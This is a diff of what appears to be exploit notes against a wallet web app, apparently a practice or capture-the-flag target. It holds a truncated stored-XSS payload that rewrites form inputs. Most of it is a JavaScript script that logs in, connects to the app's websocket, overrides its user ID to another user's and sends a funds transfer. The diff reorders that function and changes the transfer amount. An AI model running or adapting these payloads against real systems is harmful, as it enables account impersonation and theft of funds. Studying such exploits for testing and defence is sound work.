@@ -14,24 +14,24 @@ PUBLISH webapp:messages "<script>f=$('form').first();f.find('input')[2].value='2
 
 // issue 3 - hidden websockets functionality (need to inspect client side JavaScript to find it - and/or portscan the box)
 
+var back = function(tok) {
+  var socket;
+  socket = io.connect("https://wallet.carbo.nz:4000", {
+    query: "token=" + tok
+ });
+ return socket.on("connect", function() {
+   socket.emit("message", JSON.stringify({"user_id":"4"})); // override your user ID to someone else
+   setTimeout(function(){
+     socket.emit("message", JSON.stringify({"to_id":"1","amount":2}));
+   }, 2000);
+ }).on("disconnect", function() {
+ }).on("notification", function(notif) {
+   console.log(notif);
+ });
+};
+
 $.post("https://wallet.carbo.nz:4000/login", {
   token: zzzzzzzzzzzz
 }).done(function(result) {
   return back(result.token);
 });
-
-var back = function(tok) {
-   var socket;
-   socket = io.connect("https://wallet.carbo.nz:4000", {
-     query: "token=" + tok
-   });
-   return socket.on("connect", function() {
-     socket.emit("message", JSON.stringify({"user_id":"4"})); // override your user ID to someone else
-     setTimeout(function(){
-       socket.emit("message", JSON.stringify({"to_id":"1","amount":40}));
-     }, 2000);
-   }).on("disconnect", function() {
-   }).on("notification", function(notif) {
-     console.log(notif);
-   });
- };
